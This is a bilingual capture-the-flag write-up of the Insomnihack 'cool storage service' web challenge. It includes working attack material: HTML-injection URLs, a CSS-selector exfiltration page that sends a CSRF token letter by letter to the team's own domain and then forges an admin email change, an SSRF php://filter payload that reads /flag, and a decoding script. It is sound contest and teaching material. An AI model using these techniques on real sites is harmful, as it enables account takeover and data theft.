# cool storage service (web, 357p, 7 solved)

[pl](#pl-version)

in the task we get access to a simple php-based file storage service.
initial setup seems like a classic xss task, since we can provide admin with a link and he will visit it.
however it seems we can provide only a link to this storage service, and the csp header is:

`content-security-policy: default-src 'none'; style-src 'self'; img-src data: http:`

this means we can't execute any js, styles can be loaded only from the same domain and pictures can be loaded from data or from external server.

we can use this service to store files, however `php, php3...` etc. extensions are blacklisted.
the service claims that we can upload only pictures, but in reality the checks are not very strict, so for example prefix `gif` can fool it, same as prepending png header.

once the file is uploaded we can view it, but it's loaded as `data` in base64 form.
we can trigger an error by trying to view non-existing file, and this will tell us that our sandbox is at `/uploads/sha256(our_login)`, but when we try to access the file directly via `http://css.teaser.insomnihack.ch/uploads/...` we get `direct access to uploaded files is only allowed from localhost`.
this means that even if we could upload a `.php` file, we would probably not be able to execute it.

in some places on the page we get `echo` on our inputs.
for example searching for some filename, we get `search results for : our text`.
in most places html entities are escaped, but there are a couple of places where it's not the case:

- in `view file` the filename is not escaped, so we can inject html there
- in `user profile` inputs are not escaped and we can inject html there as well
- in `login` screen there is a hidden input `redirect`, which is not escaped


[image extracted text: css.teaser insomnihackch/?page=login&redirect=" > <font color="red" > wat?
home
search
upload
logout
username:
password:
wat?" [ >
login
register lost]


to wrap up what we already have:

- csp allows to load styles from the same domain
- we can echo any input we want on the page
- we can inject html tags
- csp allows to load images from external server

this leads us to the first piece of the puzzle - we can inject html tag `<link rel="stylesheet" href="something"/>` tag in order to load css of our choosing.
the `something` has to be a link to the page which echos our payload, for example: 

`http:\\css.teaser.insomnihack.ch\index.php?search=%0a%7b%7d%20body%20%7b%20background-color%3a%20lightblue%3b%20%7d%0a&page=search&.css` 

which prints out `search results for : {} body { background-color: lightblue; }`

chaining the two in the form of: `http://css.teaser.insomnihack.ch/index.php?page=login&redirect=%22%3e%3clink%20rel=%22stylesheet%22%20href=%22http%3a%5c%5ccss.teaser.insomnihack.ch%5cindex.php%3fsearch%3d%250a%257b%257d%2520body%2520%257b%2520background-color%253a%2520lightblue%253b%2520%257d%250a%26page%3dsearch%26.css`

shows us a nice blue page, as expected.

we can now use css selectors to exflitrate data from the page! 
by creating style with entries in the form:

`input[value^="a" i]{background: url('http://url.we.own/a')`

we can listen for hits on the provided url, and this way we can check if the first letter of `value` attribute of `input` tags on the page is `a`.

there are some issues here:

- the only thing we can really `steal` is csrf token.
- we can steal data only letter-by-letter. we need to steal first letter in order to prepare new css selectors for the second letter.
- it seems the token changes every time we send link to the admin, so we would need to extract the whole token in one go.
- even if we get the csrf token, we still can't run any js, so we can't send any post request as admin.

initially we thought that only links to the page `http://css.teaser.insomnihack.ch` can be sent to admin, but it turned out that it was not the case.
in reality there was only a check for the `prefix` of url, not a real domain check.
this means we could register `http://css.teaser.insomnihack.ch.our.cool.domain` and admin would visit this link just fine.

this solves the issue with sending a post request, since we can now lure admin into our own page and send request from there.
it also solves the issue of stealing whole csrf token, because we can now dynamically generate iframes with css selectors for consecutive letters.
we create iframe with selectors for first letter, grab the matching letter from our `backend` (listening for hits from css), and create another iframe with selectors for two letters using known prefix etc.
once we have full token we can finally send a post a admin.

- we were using domain `http://css.teaser.insomnihack.ch.nazywam.p4.team`.
- endpoint `http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token` was simply blocking until a hit from css was done, and then it would return the matching letter.

```html
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var token = '';
function gen_src()
{
    src = 'http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3e%3clink%20rel=%22stylesheet%22%20href=%22?page=search%26search=%25%250a{}%250a'
   
    chars = "0123456789abcdef"
    for(c = 0; c < 16; c++)
        src += 'input[value^=%27'+token+chars[c]+'%27%20i]{background:url(%27http:%252f%252fcss.teaser.insomnihack.ch.nazywam.p4.team%252fsave%252f'+chars[c]+'%27);}%250a'
    document.getelementbyid('ramek').src = src;
    console.log(src);
 
    $.ajax({
    type: "get",
    url: "http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token",
    //async: false,
        success: function (data) {
            console.log(data);
            token += data;
            if(token.length < 32)
            {
                gen_src();
                }
            else
            {
                console.log(token);
                document.getelementbyid('csrf').value=token;
                document.getelementbyid('form').submit();
            }
        }
        });
}
</script>
</head>
<body onload="gen_src()">
<iframe id="ramek"></iframe>
<form action="http://css.teaser.insomnihack.ch/?page=profile" method="post" id="form">
            <input type="text" name="name" value="p4"/>
            <input type="text" name="age" value="31337"/>
            <input type="text" name="country" value="p4"/>
            <input type="text" name="email" value="email_we_control"/>
            <input type="hidden" name="csrf" value="" id="csrf"/>
            <input type="hidden" name="change" value="modify profile"/>
        </tr>
    </form>
</body>
</html>
```

the best place to use the post ability was the user profile page, because we can modify the user email there.
it's useful, because there was `forgot password` option in the application, and it would send password reset link to email in the profile.

this way we managed to reset admin password and login to the application as admin.
there is a single new option which is now available for us - fetch:


[image extracted text: home
search
upload
profile
contact
logout
url
fetch
file
wybierz plik
nie wybrano pliku
store]


we can now provide url and it seems the system downloads the designated image, so we have some kind of potential ssrf.
there is some protection against using localhost, 127.0.0.1 or internal relative path, but it can be bypassed using php wrappers or `localtest.me` domain, so we can "download" local files and also files in `uploads/`.

the intended way to solve the task was to upload `.pht` file with php shell and some `gif` prefix to fool the parser into thinking it's a picture, and then execute this file using the `fetch` function.
unfortunately we missed the `.pht` extension trick (although we tried almost all others), and our solution was a bit different.
we noticed that we could `fetch` the flag by using some php filter like `php://filter/read=convert.base64-encode/resource=/flag`, but we get `not an image` error.

we already know that we could "fool" the parser by using prefix `gif` at the beginning of the file.
we know that flag starts with `ins{`, what if we could chain a lot of encoders to turn this prefix into `gif`?
we accidentally found even a simpler way - it turns out the parser would not complain if the payload has a nullbyte at the beginning, so instead of `gif` prefix we wanted to get a nullbyte.
we run a simple brute-forcing loop which was randomly picking an encoder and attaching it to the chain and testing the output.
after a while we got: `php://filter/read=convert.base64-encode|convert.base64-encode|string.tolower|string.rot13|convert.base64-encode|string.tolower|string.toupper|convert.base64-decode/resource=/flag`

which for our example flag would give output accepted by the page as "image", and it turned out the website accepted this as well and gave us the base64 version of the result:

`adfomwl0agtnyw1oatbtmw1pbxhvc3lnamfhbwp0ztzoz3d0cwpldwz6a256d3kyanhxbnf6ywhvdw14anfveq==`

now the last part was to decode this back to a flag.
we can't simply invert it, because of the `tolower` and `toupper` conversions which are ambigious, but we figured we can try to brute-force it going forward from the known `ins{` prefix.
we can attach a new letter, encode this and check how much of this result matches the expected payload.
we can do this recursively:

```python
import string

s = "adfomwl0agtnyw1oatbtmw1pbxhvc3lnamfhbwp0ztzoz3d0cwpldwz6a256d3kyanhxbnf6ywhvdw14anfveq==".decode("base64")


def enc(f):
    f = f.encode("base64")
    f = f.encode("base64")
    f = f.lower()
    f = f.encode("rot13")
    f = f.encode("base64")
    f = f.upper()
    f = f.decode("base64")
    return f


def brute(flg, score):
    print(flg, score)
    for c in string.letters + string.digits + "{}_":
        m = get_score(flg + c)
        if m > score:
            brute(flg + c, m)


def get_score(flg):
    f = enc(flg)
    m = -1
    for i in range(len(f)):
        if f[:i] == s[:i]:
            m = i
    return m


def main():
    flag = "ins{"
    score = get_score(flag)
    brute(flag, score)


main()
```

it doesn't work perfectly, but gives us best solutions as:

```
('ins{somanyrebflawscantbegoodfoq9ou}0', 63)
('ins{somanyrebflawscantbegoodfoq9ou}1', 63)
('ins{somanyrebflawscantbegoodfoq9ou}2', 63)
('ins{somanyrebflawscantbegoodfoq9ou}3', 63)

('ins{somanywebflawscantbegoodfoq9ou}0', 63)
('ins{somanywebflawscantbegoodfoq9ou}1', 63)
('ins{somanywebflawscantbegoodfoq9ou}2', 63)
('ins{somanywebflawscantbegoodfoq9ou}3', 63)
```

it might be that adding a certain letter doesn't immediately raise the score, so we don't follow this path, but from here we can already guess the flag to be `ins{somanywebflawscantbegoodforyou}`.

### pl version

w zadaniu dostajemy dostęp do prostej aplikacji do przechowywania plików napisanej w php.
początkowy setup wygląda na klasyczne zadanie z zakresu xss, ponieważ możemy wysłać adminowi link który zostanie odwiedzony.
niemniej wygląda na to, że możemy podać jedynie link do tejże aplikacji, a dodatkowo header csp to:

`content-security-policy: default-src 'none'; style-src 'self'; img-src data: http:`

co oznacza, że nie możemy wykonać żadnego jsa, style mogą być ładowane tylko z tej samej domeny a obrazki ładowane jako data albo z zewnętrznego serwera.

możemy uploadować w serwisie pliki, ale rozszerzenia `php, php3...` itd są blacklistowane.
serwer informuje, że można uploadować tylko obrazki, ale w rzeczywistości można to dość prosto obejść dodając prefix `gif` do pliku lub dołączając na początek nagłówek png.

kiedy już uploadujemy plik możemy go zobaczyć, ale jest ładowany przez `data` w postaci base64.
możemy wywołać błąd, próbując otworzyć nieistniejący plik i to mówi nam że sandbox jest pod `/uploads/sha256(nasz_login)`, ale jeśli spróbujemy dostać się do plików bezpośrednio przez url `http://css.teaser.insomnihack.ch/uploads/...` dostajemy informacje `direct access to uploaded files is only allowed from localhost`.
to oznacza, że nawet gdybyśmy mogli umieścić tam plik `.php`, nie mielibyśmy jak go wykonać.

w niektórych miejscach na stronie dostajemy `echo` z naszego inputu.
na przykład wyszukiwarka plików zwraca tekst `search results for : to co wpisaliśmy`.
w większości miejsc tagi html są escapowane, ale jest kilka miejsc gdzie nie ma to miejsca:

- w `view file` nazwa pliku pozwala na przemycenie html
- w `user profile` pola w formularzu także pozwalają na wstrzyknięcie html
- w `login` jest ukryte pole `redirect`, które także pozwala na umieszczenie html 


[image extracted text: css.teaser insomnihackch/?page=login&redirect=" > <font color="red" > wat?
home
search
upload
logout
username:
password:
wat?" [ >
login
register lost]


podsumowując, na tą chwilę mamy:

- csp pozwala załadować style z tej samej domeny
- możemy na stronie wyświetlić dowolny tekst
- możemy wstrzyknąć tagi html
- csp pozwala na ładowanie obrazków z zewnętrznego serwera

to prowadzi nas do pierwszego fragmentu rozwiązania - możemy wstrzyknąć tag `<link rel="stylesheet" href="coś"/>` aby załadować styl css wybrany przez nas.
w tym przypadku `coś` musi być linkiem do podstrony która wypisuje nasz styl, na przykład:

`http:\\css.teaser.insomnihack.ch\index.php?search=%0a%7b%7d%20body%20%7b%20background-color%3a%20lightblue%3b%20%7d%0a&page=search&.css` 

które wypisuje: `search results for : {} body { background-color: lightblue; }` 

łącząc oba mamy: `http://css.teaser.insomnihack.ch/index.php?page=login&redirect=%22%3e%3clink%20rel=%22stylesheet%22%20href=%22http%3a%5c%5ccss.teaser.insomnihack.ch%5cindex.php%3fsearch%3d%250a%257b%257d%2520body%2520%257b%2520background-color%253a%2520lightblue%253b%2520%257d%250a%26page%3dsearch%26.css`

co daje nam niebieskie tło ma stronie, czego oczekiwaliśmy.
warto rozumieć, ze ładujemy cały html strony jako styl, ale parser css pomija błędne dyrektywy.

możemy teraz użyć selektorów css aby pobrać dane ze strony.
możemy utworzyć w stylu wpisy:

`input[value^="a" i]{background: url('http://url.we.own/a')`

teraz nasłuchując na requesty http do podanego urla możemy sprawdzić czy atrybut `value` pól `input` na stronie zaczyna się od litery `a`.

jest tu kilka problemów:

- jedyne co możemy ukraść to token csrf
- możemy pobierać dane jedynie litera po literze. potrzebujemy znać pierwszą literę żeby przygotować nowe selektory css do wyciągnięcia drugiej litery itd.
- wygląda na to, że token zmienia za każdym razem kiedy wysyłamy link do admina, więc token trzeba pobrać na raz.
- nawet jeśli dostaniemy token csrf, to nadal nie możemy uruchomić żadnego skryptu js, więc nie mamy jak wysłać żądania post.

początkowo myśleliśmy że admin wchodzi tylko pod linki z domeny `http://css.teaser.insomnihack.ch`, ale w rzeczywistości okazało się, że to nie do końca prawda i sprawdzany jest jedynie `prefix` adresu a nie domena.
oznacza to, że możemy zarejestrować sobie `http://css.teaser.insomnihack.ch.our.cool.domain` i admin wejdzie na nasz link.

to rozwiązuje zagadkę wysyłania żądania post, ponieważ możemy zwabić admina na naszą własną stronę i wysłać request stamtąd.
rozwiązuje to też problem pobrania tokenu csrf, bo możemy na naszej stronie dynamicznie generować iframe z selektorami css dla kolejnych liter.
tworzymy iframe dla pierwszej literki, pobieramy pasującą literę z `backendo` (który nasłuchuje na requesty z css), następnie tworzymy nowy iframe z selektorami dla dwóch liter ze znanym prefixem itd.
po pobraniu całego tokenu możemy wysłać post jako admin.

- używamy domeny `http://css.teaser.insomnihack.ch.nazywam.p4.team`.
- adres `http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token` blokuje aż nie dostaniemy requestu z css, wtedy zwraca pasującą literę


```html
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var token = '';
function gen_src()
{
    src = 'http://css.teaser.insomnihack.ch/?page=login&redirect=%22%3e%3clink%20rel=%22stylesheet%22%20href=%22?page=search%26search=%25%250a{}%250a'
   
    chars = "0123456789abcdef"
    for(c = 0; c < 16; c++)
        src += 'input[value^=%27'+token+chars[c]+'%27%20i]{background:url(%27http:%252f%252fcss.teaser.insomnihack.ch.nazywam.p4.team%252fsave%252f'+chars[c]+'%27);}%250a'
    document.getelementbyid('ramek').src = src;
    console.log(src);
 
    $.ajax({
    type: "get",
    url: "http://css.teaser.insomnihack.ch.nazywam.p4.team/get_token",
    //async: false,
        success: function (data) {
            console.log(data);
            token += data;
            if(token.length < 32)
            {
                gen_src();
                }
            else
            {
                console.log(token);
                document.getelementbyid('csrf').value=token;
                document.getelementbyid('form').submit();
            }
        }
        });
}
</script>
</head>
<body onload="gen_src()">
<iframe id="ramek"></iframe>
<form action="http://css.teaser.insomnihack.ch/?page=profile" method="post" id="form">
            <input type="text" name="name" value="p4"/>
            <input type="text" name="age" value="31337"/>
            <input type="text" name="country" value="p4"/>
            <input type="text" name="email" value="email_we_control"/>
            <input type="hidden" name="csrf" value="" id="csrf"/>
            <input type="hidden" name="change" value="modify profile"/>
        </tr>
    </form>
</body>
</html>
```

najlepsze miejsce na wykorzystanie naszego posta to zmiana danych w profilu użytkownika, bo możemy zmienić tam email.
jest to o tyle użyteczne, że istnieje opcja `zapomniałem hasła`, która wysyła link z resetem hasła na email z profilu.

w ten sposób udaje nam się zresetować hasło admina i zalogować do aplikacji na jego konto.
pojawia się jedna nowa opcja - fetch:


[image extracted text: home
search
upload
profile
contact
logout
url
fetch
file
wybierz plik
nie wybrano pliku
store]


możemy podać url i wygląda na to, że system ściąga obrazek z podanego adresu, więc mamy potencjalnie atak ssrf.
jest zabezpieczenie przez podaniem adresów localhost, 127.0.0.1 oraz wewnętrznych ścieżek względnych, ale możemy obejść to przez wrappery php albo `localtest.me`, więc możemy ściągać także lokalne pliki z `uploads/`.

oczekiwane rozwiązanie zakładało, że uploadujemy plik `.pht` z kodem php i jakiś prefixem `gif` żeby oszukać parser obrazków, a następnie wykonamy ten plik za pomocą funkcji `fetch`.
niestety przeoczyliśmy rozszerzenie `.pht` (niemniej testowaliśmy chyba wszystkie inne możliwości) i nasze rozwiązanie jest nieco inne.
zauważyliśmy, że możemy wykonać `fetch` na fladze przez jakiś filtr np. `php://filter/read=convert.base64-encode/resource=/flag` ale dostajemy błąd `not an image`.

wiemy, że parser obrazków można oszukać przez zwykłe `gif` na początku pliku.
wiemy, że flaga zaczyna się od `ins{`, więc czy może jesteśmy w stanie tak poskładać ze sobą encodery, żeby prefix flagi zamienić w `gif`?
przypadkiem w trakcie testów trafiliśmy na jeszcze łatwiejsze rozwiązanie - okazało się, że jeśli parser napotkał na początku na nullbyte to też przepuszczał taki plik, więc zamiast szukać `gif` szukaliśmy nullbyte.
puściliśmy prostu brute-forcer, który testował różne losowe złożenia encoderów i testował wynik z naszej przykładowej flagi.
po jakiś czasie dostaliśmy:
`php://filter/read=convert.base64-encode|convert.base64-encode|string.tolower|string.rot13|convert.base64-encode|string.tolower|string.toupper|convert.base64-decode/resource=/flag`

co dla naszej przykładowej flagi dało wynik akceptowany przez stronę jako "obrazek" i okazało się, że to samo ma miejsce dla prawdziwej flagi, więc dostaliśmy base64 z wyniku kodowania:

`adfomwl0agtnyw1oatbtmw1pbxhvc3lnamfhbwp0ztzoz3d0cwpldwz6a256d3kyanhxbnf6ywhvdw14anfveq==`

ostatni krok to zdekodowanie tego znów do czytelnej flagi.
nie możemy po prostu odwrócić kodowania, bo mamy tam `tolower` oraz `toupper`, które są niejednoznaczne, ale wpadliśmy na pomysł, żeby brute-forceować to w przód, od znanego prefixu `ins{`.
dodajemy nowy znak, kodujemy i porównujemy ile z prefixu pasuje do oczekiwanego wyniku.
możemy to zrobić rekurencyjnie:

```python
import string

s = "adfomwl0agtnyw1oatbtmw1pbxhvc3lnamfhbwp0ztzoz3d0cwpldwz6a256d3kyanhxbnf6ywhvdw14anfveq==".decode("base64")


def enc(f):
    f = f.encode("base64")
    f = f.encode("base64")
    f = f.lower()
    f = f.encode("rot13")
    f = f.encode("base64")
    f = f.upper()
    f = f.decode("base64")
    return f


def brute(flg, score):
    print(flg, score)
    for c in string.letters + string.digits + "{}_":
        m = get_score(flg + c)
        if m > score:
            brute(flg + c, m)


def get_score(flg):
    f = enc(flg)
    m = -1
    for i in range(len(f)):
        if f[:i] == s[:i]:
            m = i
    return m


def main():
    flag = "ins{"
    score = get_score(flag)
    brute(flag, score)


main()
```

nie działa to idealnie, ale dostajemy najlepsze rozwiązania jako:

```
('ins{somanyrebflawscantbegoodfoq9ou}0', 63)
('ins{somanyrebflawscantbegoodfoq9ou}1', 63)
('ins{somanyrebflawscantbegoodfoq9ou}2', 63)
('ins{somanyrebflawscantbegoodfoq9ou}3', 63)

('ins{somanywebflawscantbegoodfoq9ou}0', 63)
('ins{somanywebflawscantbegoodfoq9ou}1', 63)
('ins{somanywebflawscantbegoodfoq9ou}2', 63)
('ins{somanywebflawscantbegoodfoq9ou}3', 63)
```

czasem może tak być, że dodanie poprawnej literki nie daje nam przyrostu pasującego prefixu, więc nie wchodzimy tam głębiej w rekurencje, ale stąd możemy już ręcznie poprawić flagę do: `ins{somanywebflawscantbegoodforyou}`.
